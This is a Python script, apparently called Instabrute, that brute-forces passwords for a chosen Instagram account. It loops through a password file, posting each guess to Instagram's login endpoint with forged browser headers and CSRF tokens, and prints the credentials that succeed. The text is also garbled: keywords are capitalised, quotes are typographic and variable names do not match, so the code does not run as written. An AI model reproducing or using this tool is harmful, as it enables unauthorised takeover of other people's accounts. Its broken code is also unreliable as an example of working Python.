Import requests
Import json
Import time
Import os
Import random
Import sys

#Help function
Def Input(text):
	Value = ‘’
	If sys.version_info.major > 2:
		Value = input(text)
	Else:
		Value = raw_input(text)
	Return str(value)

#The main class
Class Instabrute():
	Def __init__(self, username, passwordsFile=’pass.txt’):
		Self.username = username
		Self.passwordsFile = passwordsFile
		
		#Check if passwords file exists
		Self.loadPasswords()
		#Check if username exists
		Self.IsUserExists()


	#Check if password file exists and check if he contain passwords
	Def loadPasswords(self):
		If os.path.isfile(self.passwordsFile):
			With open(self.passwordsFile) as f:
				Self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print (‘[*] %s Passwords loads successfully’ % passwordsNumber)
				else:
					print(‘Password file are empty, Please add passwords to it.’)
					Input(‘[*] Press enter to exit’)
					Exit()
		Else:
			Print (‘Please create passwords file named “%s”’ % self.passwordsFile)
			Input(‘[*] Press enter to exit’)
			Exit()


	#Check if username exists in instagram server
	Def IsUserExists(self):
		R = requests.get(‘https://www.instagram.com/%s/?__a=1’ % self.username) 
		If (r.status_code == 404):
			Print (‘[*] User named “%s” not found’ % username)
			Input(‘[*] Press enter to exit’)
			Exit()
		Elif (r.status_code == 200):
			Return True

	#Try to login with password
	Def Login(self, password):
		Sess = requests.Session()
		#build requests headers
		Sess.cookies.update ({‘sessionid’ : ‘’, ‘mid’ : ‘’, ‘ig_pr’ : ‘1’, ‘ig_vw’ : ‘1920’, ‘csrftoken’ : ‘’,  ‘s_network’ : ‘’, ‘ds_user_id’ : ‘’})
		Sess.headers.update({
			‘UserAgent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36’,
			‘x-instagram-ajax’:’1’,
			‘X-Requested-With’: ‘XMLHttpRequest’,
			‘origin’: ‘https://www.instagram.com’,
			‘ContentType’ : ‘application/x-www-form-urlencoded’,
			‘Connection’: ‘keep-alive’,
			‘Accept’: ‘*/*’,
			‘Referer’: ‘https://www.instagram.com’,
			‘authority’: ‘www.instagram.com’,
			‘Host’ : ‘www.instagram.com’,
			‘Accept-Language’ : ‘en-US;q=0.6,en;q=0.4’,
			‘Accept-Encoding’ : ‘gzip, deflate’
		})

		#Update token after enter to the site
		R = sess.get(‘https://www.instagram.com/’) 
		Sess.headers.update({‘X-CSRFToken’ : r.cookies.get_dict()[‘csrftoken’]})

		#Update token after login to the site 
		R = sess.post(‘https://www.instagram.com/accounts/login/ajax/’, data={‘username’:self.username, ‘password’:password}, allow_redirects=True)
		Sess.headers.update({‘X-csrftoken’ : r.cookies.get_dict()[‘csrftoken’]})
		
		#parse response
		Data = json.loads(r.text)
		If (data[‘status’] == ‘fail’):
			Print (data[‘message’])
			Return False

		#return session if password is correct 
		If (data[‘authenticated’] == True):
			Return sess 
		Else:
			Return False


Instabrute = Instabrute(Input(‘Please enter a username: ‘))

Try:
	delayLoop = int(Input(‘[*] Please add delay between the bruteforce action (in seconds): ‘)) 
except Exception as e:
	print (‘[*] Error, software use the defult value “4”’)
	delayLoop = 4
print (‘’)

for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print (‘[*] Login success %s’ % [instabrute.username,password])
	else:
		print (‘[*] Password incorrect [%s]’ % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input(‘Type y/n to exit: ‘)).upper()
		If (WantToExit == ‘Y’ or WantToExit == ‘YES’):
			Exit()
		Else:
			Continue
		
